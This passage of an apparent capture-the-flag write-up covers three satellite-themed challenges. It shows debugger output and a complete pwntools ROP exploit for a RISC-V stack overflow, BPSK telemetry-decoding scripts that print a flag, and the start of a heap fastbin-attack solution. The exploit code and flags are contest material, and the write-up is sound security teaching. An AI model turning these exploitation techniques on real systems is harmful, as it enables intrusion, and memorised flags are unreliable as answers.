</span></span><span class=line><span class=cl><span class=nv>$s4</span>  : 0x40800f0c  →  0x40800fc8  →  0x454d4954  →  0x454d4954
</span></span><span class=line><span class=cl><span class=nv>$s5</span>  : 0x00000001  →  0x00000001
</span></span><span class=line><span class=cl><span class=nv>$s6</span>  : 0x00010fca  →  0xde067139  →  0xde067139
</span></span><span class=line><span class=cl><span class=nv>$s7</span>  : 0x00010230  →  0xc6061141  →  0xc6061141
</span></span><span class=line><span class=cl><span class=nv>$s8</span>  : 0x00000000  →  0x00000000
</span></span><span class=line><span class=cl><span class=nv>$s9</span>  : 0x00000000  →  0x00000000
</span></span><span class=line><span class=cl><span class=nv>$s10</span> : 0x00000000  →  0x00000000
</span></span><span class=line><span class=cl><span class=nv>$s11</span> : 0x00000000  →  0x00000000
</span></span><span class=line><span class=cl><span class=nv>$t3</span>  : 0x00000009  →  0x00000009
</span></span><span class=line><span class=cl><span class=nv>$t4</span>  : 0x00000000  →  0x00000000
</span></span><span class=line><span class=cl><span class=nv>$t5</span>  : 0x00054dc4  →  0x00000000  →  0x00000000
</span></span><span class=line><span class=cl><span class=nv>$t6</span>  : 0x00000005  →  0x00000005
</span></span><span class=line><span class=cl>──────────────────────────────────────────────────────────────────────────────────────────────── code:riscv:RISCV ────
</span></span><span class=line><span class=cl>      0x10f9e &lt;do_b2+74&gt;       j      0x10fa2 &lt;do_b2+78&gt;
</span></span><span class=line><span class=cl>      0x10fa0 &lt;do_b2+76&gt;       li     a5, <span class=m>0</span>
</span></span><span class=line><span class=cl>      0x10fa2 &lt;do_b2+78&gt;       mv     a0, a5
</span></span><span class=line><span class=cl> →    0x10faa &lt;do_b2+86&gt;       ret
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Cannot disassemble from <span class=nv>$PC</span>
</span></span><span class=line><span class=cl>─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
</span></span><span class=line><span class=cl>0x40800d90│+0x0000: 0x62616166  →  0x62616166    ← <span class=nv>$sp</span>
</span></span><span class=line><span class=cl>0x40800d94│+0x0004: 0x62616167  →  0x62616167
</span></span><span class=line><span class=cl>0x40800d98│+0x0008: 0x62616168  →  0x62616168
</span></span><span class=line><span class=cl>0x40800d9c│+0x000c: 0x62616169  →  0x62616169
</span></span><span class=line><span class=cl>0x40800da0│+0x0010: 0x6261616a  →  0x6261616a
</span></span><span class=line><span class=cl>0x40800da4│+0x0014: 0x6261616b  →  0x6261616b
</span></span><span class=line><span class=cl>0x40800da8│+0x0018: 0x6261616c  →  0x6261616c
</span></span><span class=line><span class=cl>0x40800dac│+0x001c: 0x6261616d  →  0x6261616d
</span></span><span class=line><span class=cl>───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
</span></span><span class=line><span class=cl><span class=o>[</span><span class=c1>#0] Id 1, stopped 0x10faa in do_b2 (), reason: BREAKPOINT</span>
</span></span><span class=line><span class=cl>─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
</span></span><span class=line><span class=cl><span class=o>[</span><span class=c1>#0] 0x10faa → do_b2(size=0x12c)</span>
</span></span><span class=line><span class=cl>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl>gef➤
</span></span></code></pre></div><p>So now we have a stack overflow, and these are the protections</p><pre tabindex=0><code>[*] &#39;/home/tt3/Workspace/dropbaby/drop-baby&#39;
    Arch:     em_riscv-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
</code></pre><p>The stack is non-executable, so the only option left is to perform a ROP. What we need is just a call to <code>puts(flag)</code>. The flag is stored at a fixed stack address, and <code>puts()</code> is also at a fixed address. There is no <code>ASLR</code> in this binary. However, the problem is that, unlike the Intel architecture, RiscV/32 passes the arguments in the <code>a0</code>, <code>a1</code>, and <code>a2</code> registers. The <code>ret</code> instruction just puts the content of the <code>ra</code> register in <code>pc</code>. Therefore, what we really need are some gadgets that set <code>ra</code> and <code>a0</code> based on stack values. Fortunately, there is a single gadget that can enable us to do both at address <code>0x167D2</code>.</p><pre tabindex=0><code>gef➤  x/9i 0x167D2
   0x167d2 &lt;_IO_puts+150&gt;:      lw      ra,28(sp)
   0x167d4 &lt;_IO_puts+152&gt;:      mv      a0,s0
   0x167d6 &lt;_IO_puts+154&gt;:      lw      s0,24(sp)
   0x167d8 &lt;_IO_puts+156&gt;:      lw      s1,20(sp)
   0x167da &lt;_IO_puts+158&gt;:      lw      s2,16(sp)
   0x167dc &lt;_IO_puts+160&gt;:      lw      s3,12(sp)
   0x167de &lt;_IO_puts+162&gt;:      lw      s4,8(sp)
   0x167e0 &lt;_IO_puts+164&gt;:      add     sp,sp,32
   0x167e2 &lt;_IO_puts+166&gt;:      ret
</code></pre><p>Here you can see that this gadget sets <code>ra</code> to an value on the stack which we control, and <code>a0</code> to <code>s0</code>. If we check the value of <code>s0</code> we can see that &mldr;</p><pre tabindex=0><code>──────────────────────────────────────────────────────────────────────────────────────────────── code:riscv:RISCV ────
      0x10f9e &lt;do_b2+74&gt;       j      0x10fa2 &lt;do_b2+78&gt;
      0x10fa0 &lt;do_b2+76&gt;       li     a5, 0
      0x10fa2 &lt;do_b2+78&gt;       mv     a0, a5
 →    0x10faa &lt;do_b2+86&gt;       ret
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x40800d90│+0x0000: 0x62616166  →  0x62616166    ← $sp
0x40800d94│+0x0004: 0x62616167  →  0x62616167
0x40800d98│+0x0008: 0x62616168  →  0x62616168
0x40800d9c│+0x000c: 0x62616169  →  0x62616169
0x40800da0│+0x0010: 0x6261616a  →  0x6261616a
0x40800da4│+0x0014: 0x6261616b  →  0x6261616b
0x40800da8│+0x0018: 0x6261616c  →  0x6261616c
0x40800dac│+0x001c: 0x6261616d  →  0x6261616d
───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x10faa in do_b2 (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x10faa → do_b2(size=0x12c)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $s0
$1 = (void *) 0x62616164
gef➤
</code></pre><p>&mldr; We control it!
Now we can directly jump to this gadget and set the value of <code>r0</code> to the address of <code>puts()</code> and <code>a0</code> to the value of <code>flag</code> by modifying the appropriate stack values</p><blockquote><p><strong>NOTE</strong>: On the remote server, the stack is a little bit different due to the presence of environment variables. Therefore, the actual address of the flag changes by some offset. We can brute force the offset since we know that it is not large.</p></blockquote><h3 class="relative group">Exploit script<div id=exploit-script class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploit-script aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Usage: ./solve.py REMOTE</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>zlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./drop-baby&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;riscv&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>bits</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># context.binary = exe</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>file drop-baby
</span></span></span><span class=line><span class=cl><span class=s2>target remote localhost:1234
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;drop.quals2023-kah5Aiv9.satellitesabove.me&#34;</span><span class=p>,</span> <span class=mi>5300</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;ticket</span><span class=si>{REDACTED}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;tmux splitw -h gdb-multiarch -ex init-gef -x .gdbrun&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=p>[</span><span class=s2>&#34;qemu-riscv32&#34;</span><span class=p>,</span> <span class=s2>&#34;-g&#34;</span><span class=p>,</span> <span class=s2>&#34;1234&#34;</span><span class=p>,</span> <span class=s2>&#34;drop-baby&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>            <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;FLAG&#34;</span><span class=p>:</span> <span class=s2>&#34;flag</span><span class=si>{REDACTED}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;TIMEOUT&#34;</span><span class=p>:</span> <span class=s2>&#34;999999999&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>APPLICATION_NAME</span> <span class=o>=</span> <span class=s2>&#34;Baby dROP&#34;</span>
</span></span><span class=line><span class=cl><span class=n>A1_MSG_LEN</span> <span class=o>=</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl><span class=n>A2_MSG_LEN</span> <span class=o>=</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=n>B1_MSG_LEN</span> <span class=o>=</span> <span class=mi>20</span>
</span></span><span class=line><span class=cl><span class=n>B2_MSG_LEN</span> <span class=o>=</span> <span class=mi>300</span>
</span></span><span class=line><span class=cl><span class=n>CC_MSG_LEN</span> <span class=o>=</span> <span class=mi>25</span>
</span></span><span class=line><span class=cl><span class=n>ZY_MSG_LEN</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>SILENT_ERRORS</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>start</span><span class=p>()</span> <span class=k>as</span> <span class=n>io</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># synchronize</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xde\xad\xbe\xef</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># b2 msg</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xb2</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>fit</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1># stack address of the flag</span>
</span></span><span class=line><span class=cl>                <span class=mi>112</span><span class=p>:</span> <span class=p>[</span><span class=mh>0x40800FE0</span> <span class=o>-</span> <span class=n>i</span><span class=p>],</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1># stack address of magic gadget</span>
</span></span><span class=line><span class=cl>                <span class=mi>116</span><span class=p>:</span> <span class=p>[</span><span class=mh>0x167D2</span><span class=p>],</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1># puts address</span>
</span></span><span class=line><span class=cl>                <span class=mi>148</span><span class=p>:</span> <span class=p>[</span><span class=mh>0x1673C</span><span class=p>],</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=n>B2_MSG_LEN</span> <span class=o>-</span> <span class=mi>4</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;X&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>zlib</span><span class=o>.</span><span class=n>crc32</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>recvd</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvall</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s2>&#34;flag{&#34;</span> <span class=ow>in</span> <span class=n>recvd</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>recvd</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></div><h2 class="relative group">FAUXY Lady<div id=fauxy-lady class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#fauxy-lady aria-label=Anchor>#</a></span></h2><h3 class="relative group">The challenge<div id=the-challenge-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-challenge-2 aria-label=Anchor>#</a></span></h3><p><strong>Category</strong>: &ldquo;Can&rsquo;t Stop the Signal, Mal&rdquo;</p><blockquote><p>A university needs your help collecting their cubesat&rsquo;s telemetry. We&rsquo;ve captured a .wav recording of the satellite signal and the university has published the telemetry definition. The recorded signal has the following characteristics:</p><ul><li>BPSK modulated</li><li>Differentially encoded</li><li>44.1k samples per second</li></ul><p>Can you reconstruct the telemetry packet?</p></blockquote><h4 class="relative group">Description<div id=description-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#description-2 aria-label=Anchor>#</a></span></h4><p>The challenge presents to us with a waveform file <code>signal.wav</code> and a description that says that the signal is BPSK modulated with a sample rate of <code>44.1Khz</code> and differentially encoded.
We were also given the packet specification of this protocol in a pdf file.</p><h3 class="relative group">Solution<div id=solution-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-2 aria-label=Anchor>#</a></span></h3><p>Our approach started with the analisys of the signal inside GNURadio Companion, we set the sample rate to 44.1Khz, imported the file with a <code>Wav file source</code> block and converted it into complex type using a <code>Float to Complex</code> block. We then used a <code>BPSK Demodulator</code> block guessing the baudrate while also watching the output with a <code>Time Sink</code> block. As soon as we set baudrate to <code>1200</code> and <code>Differential</code> to True we got a nice square wave out. We then exported the bitstream and further processed it Python.</p><h4 class="relative group">Data processing<div id=data-processing class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#data-processing aria-label=Anchor>#</a></span></h4><p>The challenge description mentioned differential encoding, so the first step we applied was a differential decoder:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>bits</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>b</span> <span class=o>^</span> <span class=n>prev</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prev</span> <span class=o>=</span> <span class=n>b</span>
</span></span></code></pre></div><p>Printing out the resulting bits, we noticed that after the first section where there was some noise, splitting the text in 8 bit chunks only ever produced two bitstrings:</p><ul><li><code>00000000</code></li><li><code>10000001</code></li></ul><p>We guessed that each of these represented a single bit in the message, and we also knew from the challenge description that the packets we were looking for started with a magic number of <code>0x1ACFFC1D</code>. We looked for a bit mapping that contained the magic, and decoded the bitstream, mapping <code>00000000</code> to <code>1</code> and <code>10000001</code> to <code>0</code>.</p><p>Finally, we extracted the three packets contained in the bitstream and printed their contents, revealing the three parts of the flag.</p><h3 class="relative group">Solution scripts<div id=solution-scripts class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-scripts aria-label=Anchor>#</a></span></h3><h4 class="relative group">Bit mapping<div id=bit-mapping class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#bit-mapping aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># out.out comes from gnuradio</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;out.out&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>fin</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>fin</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bits</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>ch</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>bin</span><span class=p>(</span><span class=n>ch</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>b</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>out</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>prev</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>bits</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>b</span> <span class=o>^</span> <span class=n>prev</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prev</span> <span class=o>=</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>out</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>str</span><span class=p>,</span> <span class=n>out</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>msg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>out</span><span class=p>),</span> <span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>out</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;00000000&#39;</span><span class=p>:</span> <span class=n>msg</span> <span class=o>+=</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span> <span class=n>msg</span> <span class=o>+=</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>msg</span><span class=p>)</span>
</span></span></code></pre></div><h4 class="relative group">Final decoding<div id=final-decoding class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#final-decoding aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;000110101100111111111100000111010000000001100100000000000110010001111110001100010100000101000010001011010100001101000100010001010011001001000110010001110100100001001001001011010011000100000011111100000110011001101100011000010110011101111011011101110110100001101001011100110110101101100101011110010011100100110001001101000011011000110001001110000110110101101001011010110110010100110100001110100100011101001101011110100101011000110101001110000111100101000101011011010100110101110001010011110110011101010000010110100101010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011010011000000101111110111111111&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;000110101100111111111100000111010000000001100100000000000110010001111110001100010100000101000010001011010100001101000100010001010011001001000110010001110100100001001001001011010011000100000011111100000111011101010010011010100111010101001101011011100110110100110010010100000110100000101101010001110110101100110110010000010100111001000001011011010101100001001010010100010110101001000001001100000100010101101000011011010011000101000101010010000111000001001001001110010100110101001000001100110101010001000111011110100011010100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100011101010101101111110111111111&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;000110101100111111111100000111010000000001100100000000000110010001111110001100010100000101000010001011010100001101000100010001010011001001000110010001110100100001001001001011010011000100000011111100000100001100110100010010010100001101011000011110000110101101110101001110000100010101001010011010000110101000111001011101010100110001010000010110010011010001101100010000110111000001000100010100000111011101110011011011010100001101101000011100110101100101111101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000101111011001111101111110111111111&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>packet</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>text</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>packet</span><span class=p>),</span> <span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>v</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>packet</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>],</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>text</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>text</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># flag{whiskey914618mike4:GMzV58yEmMqOgPZTwRjuMnm2Ph-Gk6ANAmXJQjA0Ehm1EHpI9MH3TGz5C4ICXxku8EJhj9uLPY4lCpDPwsmChsY}</span>
</span></span></code></pre></div><h2 class="relative group">Kalman At Me Bro<div id=kalman-at-me-bro class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#kalman-at-me-bro aria-label=Anchor>#</a></span></h2><h3 class="relative group">The challenge<div id=the-challenge-3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-challenge-3 aria-label=Anchor>#</a></span></h3><p><strong>Category</strong>: &ldquo;Pure Pwnage&rdquo;</p><p><strong>Sumamry</strong>: Use fastbin attack to modify the covariance matrix of the Kalman Filter employed in the implemented simulation.</p><h4 class="relative group">Description<div id=description-3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#description-3 aria-label=Anchor>#</a></span></h4><p>In this challenge, an Kalman Filter is implemented to estimate the relative position of a satellite with respect to a space station. The estimate is derived from a given set of movements and the position readings coming from a sensor. The objective is to achieve a final estimated relative position that is within 10 meters of the space station along x,y,z axes, with a valid state for the Kalman filter and high confidence on the estimate (small covariance matrix).</p><h3 class="relative group">Solution<div id=solution-3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-3 aria-label=Anchor>#</a></span></h3><h4 class="relative group">Used types<div id=used-types class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#used-types aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>PositionMeasurement</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>time</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>x</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>y</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>z</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
